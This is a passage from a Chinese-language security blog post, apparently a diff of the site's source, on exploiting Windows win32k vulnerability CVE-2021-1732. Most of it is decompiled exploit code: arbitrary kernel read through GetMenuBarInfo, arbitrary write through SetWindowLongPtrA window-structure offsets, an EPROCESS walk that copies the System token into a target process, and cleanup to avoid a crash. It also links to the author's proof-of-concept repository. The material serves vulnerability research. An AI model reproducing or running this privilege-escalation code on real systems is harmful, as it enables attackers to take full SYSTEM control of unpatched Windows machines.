&gt;&gt; <span class="number">2</span>)) = <span class="number">16</span>;</span><br><span class="line">  v13 = (unsigned int)<span class="variable">_Offset_28</span>;</span><br><span class="line">  *v7 = <span class="number">0</span>x88888888;</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)&amp;v7[<span class="number">2</span> * (v13 &gt;&gt; <span class="number">3</span>)] = v9;</span><br><span class="line">  v7[v12] = <span class="number">1</span>;</span><br><span class="line">  v7[(unsigned <span class="variable">__int64</span>)(unsigned int)<span class="variable">_Offset_44</span> &gt;&gt; <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">  v14 = <span class="variable">_X64_</span> == <span class="number">0</span>;</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)&amp;v7[<span class="number">2</span> * ((unsigned <span class="variable">__int64</span>)(unsigned int)<span class="variable">_Offset_58</span> &gt;&gt; <span class="number">3</span>)] = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    *(<span class="variable">_DWORD</span> *)(v10 + <span class="number">4</span>) = <span class="number">0</span>x10;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(<span class="variable">_QWORD</span> *)(v10 + <span class="number">8</span>) = <span class="number">0</span>x10i64;</span><br><span class="line">  v15 = (unsigned int)<span class="variable">_Offset_98</span>;</span><br><span class="line">  result = <span class="number">1</span>i64;</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)v10 = v7;</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)(v11 + <span class="number">8</span> * (v15 &gt;&gt; <span class="number">3</span>)) = v10;</span><br><span class="line">  <span class="variable">_tagMenuBarInfo</span>.cbSize = <span class="number">0</span>x30;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//ReadQWORD</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////</span></span><br><span class="line">  KernelAddress = a1;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="variable">_Is_rcBar_left_has_value</span> )</span><br><span class="line">  {</span><br><span class="line">    v12 = (unsigned int)<span class="variable">_tagMenuBarInfo_rcBar_left</span>;<span class="comment">//0x40</span></span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v2 = LocalAlloc(<span class="number">0</span>x40i64, <span class="number">0</span>x200i64);</span><br><span class="line">    v11 = <span class="variable">_hWnd1</span>;</span><br><span class="line">    *(<span class="variable">_QWORD</span> *)<span class="variable">_mem_zeroinit_8</span> = v2;</span><br><span class="line">    GetMenuBarInfo(v11, <span class="number">4294967293</span>i64, <span class="number">1</span>i64, &amp;<span class="variable">_tagMenuBarInfo</span>);<span class="comment">// GetMenuBarInfo &#x4E0E;&#x7A97;&#x53E3;&#x5173;&#x8054;&#x7684;&#x83DC;&#x5355;&#x680F; first item</span></span><br><span class="line">    v12 = (unsigned int)<span class="variable">_tagMenuBarInfo</span>.rcBar.left;<span class="comment">// &#x7A97;&#x53E3;&#x83DC;&#x5355;&#x680F;&#x5DE6;&#x4E0A;&#x89D2;&#x7684;x&#x5750;&#x6807;&#x3002;</span></span><br><span class="line">    <span class="variable">_tagMenuBarInfo_rcBar_left</span> = <span class="variable">_tagMenuBarInfo</span>.rcBar.left;</span><br><span class="line">    <span class="variable">_Is_rcBar_left_has_value</span> = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  v15 = <span class="variable">_hWnd1</span>;</span><br><span class="line">  *(<span class="variable">_QWORD</span> *)<span class="variable">_mem_zeroinit_8</span> = KernelAddress - v12;</span><br><span class="line">  GetMenuBarInfo(v15, <span class="number">0</span>xFFFFFFFDi64, <span class="number">1</span>i64, &amp;<span class="variable">_tagMenuBarInfo</span>);</span><br><span class="line">  return (unsigned int)<span class="variable">_tagMenuBarInfo</span>.rcBar.left + ((signed <span class="variable">__int64</span>)<span class="variable">_tagMenuBarInfo</span>.rcBar.top &lt;&lt; <span class="number">32</span>);</span><br></pre></td></tr></table></figure>
+
+<p>&#x6700;&#x7EC8;&#x6784;&#x9020;&#x7684;&#x5185;&#x5B58;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="/2021/03/16/20210316-1/1615382670446.png" alt="1615382670446"></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x8E29;&#x5751;&#xFF0C;&#x7136;&#x9E45;&#x771F;&#x5B9E;&#x60C5;&#x51B5;&#x5E76;&#x4E0D;&#x662F;&#x8FD9;&#x4E48;&#x7B80;&#x5355;&#xFF0C;&#x5728;MEM_200h_addr&#x7684;&#x6784;&#x9020;&#x4E0A;&#xFF0C;&#x5B9E;&#x9645;&#x5185;&#x5B58;&#x662F;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x7B80;&#x5355;&#x5730;&#x521D;&#x59CB;&#x5316;&#x4E3A;<span class="number">0</span>&#x3002;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/16/20210316-1/1615536517246.png" alt="1615536517246"></p>
+<p>&#x8FD9;&#x4E00;&#x5927;&#x6BB5;128&#x4F4D;&#x5BC4;&#x5B58;&#x5668;&#x5230;&#x5E95;&#x5728;&#x5E72;&#x751A;&#x4E48;&#xFF0C;&#x53D1;&#x751F;&#x751A;&#x4E48;&#x4E8B;&#x4E86;&#xFF1F;&#x556A;&#x7684;&#x4E00;&#x4E0B;&#xFF0C;&#x5F88;&#x5FEB;&#x554A;&#xFF0C;&#x8C03;&#x8BD5;&#x7ED3;&#x679C;&#x5C31;&#x51FA;&#x6765;&#x4E86;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615536994130.png" alt="1615536994130"></p>
+<p>&#x5927;&#x6982;&#x610F;&#x601D;&#x5C31;&#x662F;&#x5BF9;&#x8FD9;0x200&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x6BCF;4&#x5B57;&#x8282;&#x503C;&#x4E3A;&#x5F53;&#x524D;offset&#xFF0C;offset&#x4E3A;&#x4ECE;&#x5730;&#x5740;&#x5176;&#x5B9E;&#x504F;&#x79FB;&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x8BFB;&#x539F;&#x8BED;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x8FD9;&#x4E00;&#x6B65;&#x64CD;&#x4F5C;&#x3002;&#x4E2A;&#x4EBA;&#x5728;&#x8C03;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5F53;&#x5BF9;&#x6B64;&#x5904;&#x5185;&#x5B58;&#x53EA;&#x521D;&#x59CB;&#x5316;&#x4E3A;0&#x65F6;&#xFF0C;&#x4E00;&#x65E6;&#x6267;&#x884C;GetMenuBarInfo&#x51FD;&#x6570;&#xFF0C;&#x4FBF;&#x4F1A;BSOD&#xFF0C;&#x731C;&#x6D4B;&#x662F;&#x56E0;&#x4E3A;&#x5185;&#x6838;&#x7684;xxxGetMenubarInfo&#x51FD;&#x6570;&#x56E0;&#x4E3A;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x521D;&#x59CB;&#x5316;&#x800C;&#x5D29;&#x6E83;&#xFF0C;&#x800C;&#x4E0A;&#x9762;&#x8C03;&#x8BD5;&#x4FE1;&#x606F;&#x4E2D;&#x7684;&#x5185;&#x5B58;&#x5E03;&#x5C40;&#x662F;&#x6B63;&#x5E38;GetMenuBar&#x6240;&#x9700;&#x8981;&#x7684;&#x5E03;&#x5C40;&#xFF08;&#x4EC5;&#x4E2A;&#x4EBA;&#x731C;&#x6D4B;&#xFF09;&#x3002;</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (int i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>/<span class="number">4</span>;i++)</span><br><span class="line">{</span><br><span class="line">    *(DWORD*)v2 = i * <span class="number">4</span>;</span><br><span class="line">    v2 = (char*)v2 + <span class="number">4</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x800C;&#x771F;&#x6B63;&#x7684;&#x5185;&#x5B58;&#x5E03;&#x5C40;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615537726621.png" alt="1615537726621"></p>
+<h6 id="2-&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x539F;&#x8BED;"><a href="#2-&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x539F;&#x8BED;" class="headerlink" title="2.&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x539F;&#x8BED;"></a>2.<u>&#x6784;&#x9020;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x539F;&#x8BED;</u></h6><p>&#x540C;&#x7406;&#xFF0C;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x539F;&#x8BED;&#x4E5F;&#x9700;&#x8981;&#x9996;&#x5148;&#x9700;&#x8981;&#x4E00;&#x4E2A;where&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FDB;&#x7A0B;&#x63D0;&#x6743;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5411;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x7684;Token&#x5730;&#x5740;&#x3002;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x9996;&#x5148;&#x901A;&#x8FC7;&#x8FDB;&#x7A0B;ID&#x904D;&#x5386;&#xFF0C;&#x62FF;&#x5230;&#x6307;&#x5B9A;ID&#x540E;&#x901A;&#x8FC7;EPROCESS+0x360&#x5B9A;&#x4F4D;Token&#x5730;&#x5740;&#x3002;&#x800C;&#x8FDB;&#x7A0B;&#x94FE;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x524D;&#x9762;&#x7684;&#x8BFB;&#x539F;&#x8BED;&#x6784;&#x9020;&#x4E2D;&#x63D0;&#x5230;&#x7684;&#x8986;&#x76D6;spmenu&#x65B9;&#x6CD5;&#xFF0C;SetWindowLongPtr&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x6B63;&#x662F;&#x76EE;&#x6807;&#x5730;&#x5740;&#x5904;&#x4E4B;&#x524D;&#x7684;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6CC4;&#x9732;&#x51FA;hwnd1&#x7684;tagWND&#x6210;&#x5458;spmenu(tagMENU*&#x7ED3;&#x6784;)&#xFF0C;&#x901A;&#x8FC7;&#x591A;&#x6B21;&#x4F7F;&#x7528;&#x8BFB;&#x539F;&#x8BED;&#xFF0C;&#x6211;&#x4EEC;&#x5373;&#x53EF;&#x62FF;&#x5230;&#x8FDB;&#x7A0B;Token&#x5730;&#x5740;&#x548C;&#x503C;&#x3002;</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt tagMENU</span><br><span class="line">win32k!tagMENU</span><br><span class="line">   +<span class="number">0</span>x000 head             : <span class="variable">_PROCDESKHEAD</span></span><br><span class="line">   </span><br><span class="line">kd&gt; dt <span class="variable">_THROBJHEAD</span></span><br><span class="line">win32k!<span class="variable">_THROBJHEAD</span></span><br><span class="line">   +<span class="number">0</span>x000 h                : Ptr64 Void</span><br><span class="line">   +<span class="number">0</span>x008 cLockObj         : Uint4B</span><br><span class="line">   +<span class="number">0</span>x010 pti              : Ptr64 tagTHREADINFO</span><br><span class="line">   </span><br><span class="line">kd&gt; dt tagTHREADINFO</span><br><span class="line">win32k!tagTHREADINFO</span><br><span class="line">   +<span class="number">0</span>x000 pEThread         : Ptr64 <span class="variable">_ETHREAD</span></span><br><span class="line">   +<span class="number">0</span>x008 RefCount         : Uint4B</span><br><span class="line">   +<span class="number">0</span>x010 ptlW32           : Ptr64 <span class="variable">_TL</span></span><br><span class="line">   +<span class="number">0</span>x018 pgdiDcattr       : Ptr64 Void</span><br><span class="line">   ...</span><br><span class="line">   </span><br><span class="line">kd&gt; dt  <span class="variable">_ETHREAD</span></span><br><span class="line">nt!<span class="variable">_ETHREAD</span></span><br><span class="line">   +<span class="number">0</span>x000 Tcb              : <span class="variable">_KTHREAD</span></span><br><span class="line">   ...</span><br><span class="line">kd&gt; dt <span class="variable">_KTHREAD</span> </span><br><span class="line">nt!<span class="variable">_KTHREAD</span></span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0</span>x220 Process : Ptr64 <span class="variable">_KPROCES</span></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="number">1</span>: kd&gt; dt <span class="variable">_EPROCESS</span></span><br><span class="line">ntdll!<span class="variable">_EPROCESS</span></span><br><span class="line">   +<span class="number">0</span>x000 Pcb              : <span class="variable">_KPROCESS</span></span><br><span class="line">   +<span class="number">0</span>x2e0 ProcessLock      : <span class="variable">_EX_PUSH_LOCK</span></span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0</span>x360 Token            : <span class="variable">_EX_FAST_REF</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x6B64;&#x5916;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;what&#x503C;&#xFF0C;&#x6B64;&#x503C;&#x5728;&#x63D0;&#x6743;&#x65F6;&#x5FC5;&#x7136;&#x662F;System&#x8FDB;&#x7A0B;&#x7684;Token&#x503C;&#x3002;</p>
+<p>&#x6709;&#x4E86;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x5177;&#x4F53;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#xFF1F;</p>
+<p>&#x8FD8;&#x8BB0;&#x5F97;&#x6211;&#x4EEC;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;&#x591A;&#x4E2A;&#x7A97;&#x53E3;&#x521B;&#x5EFA;&#x561B;&#xFF0C;&#x6211;&#x4EEC;&#x7559;&#x4E86;&#x4E24;&#x4E2A;&#x7A97;&#x53E3;hwnd0&#x548C;hwnd1&#x3002;&#x8FD9;&#x4E24;&#x4E2A;&#x7A97;&#x53E3;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;hwnd0&#x624B;&#x52A8;&#x8C03;&#x7528;NtUserConsoleControl&#xFF0C;&#x5373;&#x4FEE;&#x6539;&#x5176;flag&#x4E3A;0x800&#x3002;&#x6B64;&#x5916;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x4F7F;&#x7528;HMValidateHandle&#x62FF;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x7A97;&#x53E3;&#x7684;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x7ED3;&#x6784;&#x5730;&#x5740;&#xFF0C;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x504F;&#x79FB;&#xFF0C;&#x5373;&#x53EF;&#x901A;&#x8FC7;&#x7A97;&#x53E3;0&#x6765;&#x8BBF;&#x95EE;&#x7A97;&#x53E3;1&#x7684;&#x7ED3;&#x6784;&#x6210;&#x5458;&#x3002;</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd0</span>, <span class="variable">_hWnd1_tagWND_Offset</span> + <span class="number">0</span>x128 - <span class="variable">_hWnd0_tagWND_Offset</span>, where);<span class="comment">// //&#x8BBE;&#x7F6E;&#x7A97;&#x53E3;1 &#x7684;tagWND&#x7684;extarMemaddr &#x4E5F;&#x5C31;&#x662F; &#x5199;&#x54EA;</span></span><br><span class="line">return SetWindowLongPtrA(<span class="variable">_hWnd1</span>, <span class="number">0</span>, v2);      <span class="comment">// &#x6211;&#x4EEC;&#x5728;&#x4E0A;&#x4E00;&#x6B65;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x597D;&#x4E86;&#x5199;&#x54EA;&#xFF0C;&#x73B0;&#x5728;&#x771F;&#x6B63;&#x5F80;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x5199;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x9996;&#x5148;&#x4F7F;&#x7528;SetWindowLongPtrA&#x901A;&#x8FC7;&#x7A97;&#x53E3;0&#x8BBE;&#x7F6E;&#x7A97;&#x53E3;1&#x7684;0x128&#x5904;&#x6210;&#x5458;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;ExtraDataAddr,&#x8BBE;&#x7F6E;&#x597D;&#x4E86;&#x4E4B;&#x540E;&#x518D;&#x901A;&#x8FC7;SetWindowLongPtrA&#x5199;&#x7A97;&#x53E3;1&#x7684;ExtraData&#x5199;&#x6570;&#x636E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5B8C;&#x6210;&#x4E86;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;&#x3002;</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">v11 = readQWORD(v9 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)_Offset_50);</span><br><span class="line">v12 = v11;                                    <span class="comment">// tagMENU</span></span><br><span class="line">v13 = readQWORD(v11 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)g__Offset_18);<span class="comment">// tagMenu.tagDesktop(tagDESKTOP)</span></span><br><span class="line">tagWin32Heap_ = readQWORD(v13 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)g__Offset_80);<span class="comment">// tagDesktop.pheapDesktop(tagWIN32HEAP)</span></span><br><span class="line">v14 = readQWORD(v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)g__Offset_10);<span class="comment">// tagMenu.head.pti(tagTHREADINFO)</span></span><br><span class="line">v15 = readQWORD(v14);                         <span class="comment">// tagTHREADINFO.pEThread&#xFF08;_ETHREAD&#xFF09;</span></span><br><span class="line">v16 = readQWORD(v15 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)g__Offset_220);<span class="comment">// KTHREAD.EProcess</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> ( !System_Token || !targetProcessToken_addr )</span><br><span class="line">{</span><br><span class="line">    v23 = readQWORD(v17 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset_UniqueProcessId);</span><br><span class="line">    <span class="keyword">if</span> ( v23 == <span class="number">4</span> )</span><br><span class="line">      System_Token = readQWORD(v17 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset_Token);</span><br><span class="line">    <span class="keyword">if</span> ( v23 == v18 )</span><br><span class="line">      targetProcessToken_addr = v17 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset_Token;</span><br><span class="line">    v17 = readQWORD(v17 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset_ActiveProcessLinks) - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)offset_ActiveProcessLinks;</span><br><span class="line">    <span class="keyword">if</span> ( v17 == v40 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ( System_Token )</span><br><span class="line">  writeQWORD(targetProcessToken_addr, System_Token);</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-&#x6062;&#x590D;&#x73B0;&#x573A;"><a href="#3-&#x6062;&#x590D;&#x73B0;&#x573A;" class="headerlink" title="3.&#x6062;&#x590D;&#x73B0;&#x573A;"></a>3.<u>&#x6062;&#x590D;&#x73B0;&#x573A;</u></h6><p>&#x5728;&#x8FDB;&#x884C;Token&#x66FF;&#x6362;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5BF9;&#x73B0;&#x573A;&#x8FDB;&#x884C;&#x6062;&#x590D;&#xFF0C;&#x9632;&#x6B62;BSOD&#x3002;</p>
+<p>&#x8981;&#x6062;&#x590D;&#x7684;&#x5305;&#x62EC;hwnd1&#x7A97;&#x53E3;&#x7684;spmenu&#x6570;&#x636E;  hwnd1&#x7684;ExtraData&#x5BFB;&#x5740;&#x8303;&#x56F4;</p>
+<p>hwnd0&#x7A97;&#x53E3;&#x6837;&#x5F0F;</p>
+<p>hwnd0&#x7684;flag&#x6062;&#x590D; hwnd0&#x7684;ExtraDataAddr&#x6062;&#x590D;</p>
+<p>&#x91CA;&#x653E;&#x5404;&#x79CD;&#x81EA;&#x5DF1;&#x7533;&#x8BF7;&#x7684;&#x5806;&#x5185;&#x5B58;</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v26 = <span class="variable">_HMValidateHandle</span>(hWnd2, <span class="number">1</span>i64);</span><br><span class="line">v27 = <span class="number">8</span>i64;</span><br><span class="line">v28 = *(<span class="variable">_QWORD</span> *)(v26 + <span class="number">8</span> * ((unsigned <span class="variable">__int64</span>)(unsigned int)dword_140056A7C &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0</span>x80000000000i64;</span><br><span class="line">v29 = *(unsigned int *)(v27 + v26);</span><br><span class="line">SetWindowLongPtrA(</span><br><span class="line">    <span class="variable">_hWnd0</span>,</span><br><span class="line">    nIndex + <span class="variable">_hWnd1_tagWND_Offset</span> - <span class="variable">_hWnd0_tagWND_Offset</span>,</span><br><span class="line">    tagWin32Heap_ + v29 + (unsigned int)nIndex);</span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd1</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">SetWindowLongPtrA(</span><br><span class="line">    <span class="variable">_hWnd0</span>,</span><br><span class="line">    nIndex + <span class="variable">_hWnd1_tagWND_Offset</span> - <span class="variable">_hWnd0_tagWND_Offset</span>,</span><br><span class="line">    tagWin32Heap_ + v29 + (unsigned int)dword_140056A7C);</span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd1</span>, <span class="number">0</span>, v28);</span><br><span class="line">v30 = <span class="variable">_hWnd1_tagWND_Offset</span> - <span class="variable">_hWnd0_tagWND_Offset</span>;</span><br><span class="line">v31 = <span class="variable">_Offset_18</span> + v30;</span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd0</span>, v31, v6);</span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd1</span>, -<span class="number">12</span>, dwNewLong);</span><br><span class="line">v32 = <span class="variable">_hWnd1_tagWND_Offset</span> - <span class="variable">_hWnd0_tagWND_Offset</span>;</span><br><span class="line">v33 = <span class="variable">_Offset_18</span> + v32;</span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd0</span>, v33, old_Style);<span class="comment">//hwnd1 back to old style</span></span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd0</span>, nIndex + <span class="variable">_hWnd1_tagWND_Offset</span> - <span class="variable">_hWnd0_tagWND_Offset</span>, <span class="variable">_tagWND_0x128_hWnd1</span>);<span class="comment">//restore hwnd1 tagWND+0x128</span></span><br><span class="line">SetWindowLongPtrA(<span class="variable">_hWnd0</span>, nIndex, (unsigned int)<span class="variable">_tagWND_0x128_hWnd0</span>);<span class="comment">//restore hwnd0 tagWND+0x128</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-&#x653B;&#x51FB;&#x5411;&#x91CF;"><a href="#3-&#x653B;&#x51FB;&#x5411;&#x91CF;" class="headerlink" title="3. &#x653B;&#x51FB;&#x5411;&#x91CF;"></a>3. &#x653B;&#x51FB;&#x5411;&#x91CF;</h5><p>Local</p>
+<p><img src="/2021/03/16/20210316-1/1615346562069.png" alt="1615346562069"></p>
+<h5 id="4-&#x5229;&#x7528;&#x6F14;&#x793A;"><a href="#4-&#x5229;&#x7528;&#x6F14;&#x793A;" class="headerlink" title="4.&#x5229;&#x7528;&#x6F14;&#x793A;"></a>4.&#x5229;&#x7528;&#x6F14;&#x793A;</h5><p><img src="/2021/03/16/20210316-1/1.gif" alt="image"></p>
+<p>&#x6784;&#x9020;&#x7684;exp_poc&#x4EE3;&#x7801;&#x5730;&#x5740;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Saturn35/</span>POC<span class="regexp">/tree/m</span>ain<span class="regexp">/CVE-2021-1732/</span>exp_poc</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-&#x8E29;&#x5751;&#x8BB0;&#x5F55;"><a href="#5-&#x8E29;&#x5751;&#x8BB0;&#x5F55;" class="headerlink" title="5.&#x8E29;&#x5751;&#x8BB0;&#x5F55;"></a><font color="Red">5.&#x8E29;&#x5751;&#x8BB0;&#x5F55;</font></h5><p>1.<u>Hwnd1&#x7684;spmenu&#x5076;&#x5C14;&#x83B7;&#x53D6;&#x4E0D;&#x5230;</u></p>
+<p>&#x7A76;&#x5176;&#x539F;&#x56E0;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x5229;&#x7528;&#x4EE3;&#x7801;&#x7684;&#x601D;&#x8DEF;&#x6DF1;&#x53D7;crash&#x4EE3;&#x7801;&#x7684;&#x5370;&#x8C61;&#xFF0C;&#x8BA4;&#x4E3A;&#x5FAA;&#x73AF;&#x521B;&#x5EFA;&#x7A97;&#x53E3;&#x65F6;&#x7B2C;&#x4E00;&#x4E2A;&#x521B;&#x5EFA;&#x7684;&#x5C31;&#x662F;hwnd0,&#x7B2C;&#x4E8C;&#x4E2A;&#x521B;&#x5EFA;&#x7684;&#x5C31;&#x662F;hwnd1&#x3002;&#x7136;&#x9E45;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x8FD9;&#x4E48;&#x5199;&#xFF0C;&#x5FC5;&#x987B;&#x5C06;tagWND+8&#x5904;&#x503C;&#xFF08;cLockObj &#xFF09;&#x5C0F;&#x7684;&#x4F5C;&#x4E3A;hwnd0&#xFF0C;&#x5927;&#x7684;&#x4F5C;&#x4E3A;hwnd1&#x3002;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x591A;&#x6B21;&#x4F7F;&#x7528;SetWindowLongPtrA&#x8FDB;&#x884C;&#x8DE8;&#x7A97;&#x53E3;&#x8BBF;&#x95EE;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;&#x504F;&#x79FB;offset&#x5DEE;&#x503C;&#x6765;&#x8FDB;&#x884C;&#x503C;&#x5F97;&#x8BBE;&#x7F6E;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x6B21;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x51FA;&#x73B0;&#x4E86;hwnd0&#x7684;cLockObj&#x503C;&#x5927;&#x4E8E;hwnd1&#x7684;cLockObj &#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x4F20;&#x5165;SetWindowLongPtrA&#x7684;nIndex&#x53D8;&#x4E3A;&#x8D1F;&#x503C;&#xFF0C;&#x5219;&#x5199;&#x7A97;&#x53E3;&#x6210;&#x5458;&#x5931;&#x8D25;&#xFF0C;&#x56E0;&#x6B64;&#x5F71;&#x54CD;&#x540E;&#x7EED;&#x7684;spmenu&#x83B7;&#x53D6;&#x3002;&#x200B;</p>
